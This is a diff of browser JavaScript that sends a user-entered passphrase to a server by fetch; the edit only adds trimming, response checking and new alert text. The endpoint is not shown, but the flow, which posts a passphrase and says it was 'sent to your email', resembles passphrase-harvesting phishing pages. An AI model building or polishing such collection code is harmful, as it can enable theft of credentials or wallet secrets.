@@ -1,14 +1,14 @@
-// Get the form and the input element for passphrase
+// Get the input and button elements
 const passphraseInput = document.getElementById('passphrase-input');
 const submitButton = document.getElementById('submit-button');
 
-// Function to send passphrase to server via AJAX
+// Add an event listener to the button
 submitButton.addEventListener('click', function (event) {
-  event.preventDefault(); // Prevent the default form submission
+  event.preventDefault(); // Prevent default form submission
 
-  const passphrase = passphraseInput.value;
+  const passphrase = passphraseInput.value.trim(); // Get the passphrase and trim whitespace
 
-  // Validate passphrase before sending
+  // Validate the passphrase
   if (!passphrase) {
     alert('Please enter a passphrase');
     return;
@@ -22,13 +22,19 @@ submitButton.addEventListener('click', function (event) {
     },
     body: JSON.stringify({ passphrase: passphrase }),
   })
-    .then(response => response.json())
-    .then(data => {
-      console.log('Thank You!', data);
-      alert('Passphrase sent to your email!');
+    .then((response) => {
+      // Check if the response is OK
+      if (!response.ok) {
+        throw new Error('Failed to send passphrase');
+      }
+      return response.json();
     })
-    .catch(error => {
-      console.error('Error sending passphrase:', error);
-      alert('Failed to send passphrase');
+    .then((data) => {
+      console.log('Thank you:', data); // Log data for debugging
+      alert('Thank you! Your passphrase has been sent to your email.');
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+      alert('There was an error sending the passphrase. Please try again later.');
     });
 });
